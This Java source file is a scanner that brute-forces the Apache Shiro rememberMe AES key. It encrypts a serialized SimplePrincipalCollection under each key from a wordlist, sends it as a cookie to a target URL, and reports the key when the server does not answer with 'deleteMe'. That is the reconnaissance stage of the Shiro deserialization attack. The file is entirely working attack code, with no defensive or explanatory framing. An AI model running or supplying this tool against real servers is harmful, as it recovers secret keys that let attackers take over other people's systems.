import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.commons.beanutils.BeanUtils;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseEntity;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;

import java.io.*;
import java.util.ArrayList;
import java.util.List;

public class Scanshiro  extends Thread{
    private String uri = "http://127.0.0.1:8080";
    public void genClass(String path) throws IOException {
        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File(path)));
        oos.writeObject(simplePrincipalCollection);
    }
    public String httpGet(String payload){
        HttpHeaders headers = new HttpHeaders();
        RestTemplate restTemplate=new RestTemplate();
        List<String> cookies =new ArrayList<String>();
        cookies.add("rememberMe="+payload);
        headers.put(HttpHeaders.COOKIE,cookies);
        HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<MultiValueMap<String, String>>(null,headers);
        ResponseEntity<String> response = restTemplate.postForEntity(this.uri, request, String.class);
        HttpHeaders headers1 = response.getHeaders();
        return String.valueOf(headers1);
    }

    public void run(String path, String key) throws Exception{
        genClass(path);
        AES aes = new AES();
        String cookie = aes.encrypt(path,key);
        String headers = httpGet(cookie);
        if ( !headers.contains("deleteMe")){
            System.out.println("key:" + key);
        }
    }

    public static  ArrayList<String> readFile(String path)throws Exception{
        BufferedReader bufferedReader = new BufferedReader(new FileReader(new File(path)));
        ArrayList<String> s = new ArrayList<>();
        String tmp;
        while ((tmp= bufferedReader.readLine()) != null){
            s.add(tmp);
        }
        return s;
    }


    public static void main(String[] args) throws Exception {
        ArrayList<String> keys = null;
        ArrayList<String> strings = readFile("keys.txt");
        Scanshiro scanshiro = new Scanshiro();
        for (String key:
             strings) {
            scanshiro.run("cer", key);
        }


    }
}
class AES {
    public String encrypt(String path,String key) throws Exception {
        AesCipherService aes = new AesCipherService();
        ByteSource ciphertext = aes.encrypt(getBytes(path), Base64.decode(key));
        return ciphertext.toString();
    }


    public static byte[] getBytes(String path) throws Exception{
        InputStream inputStream = new FileInputStream(path);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;

    }
}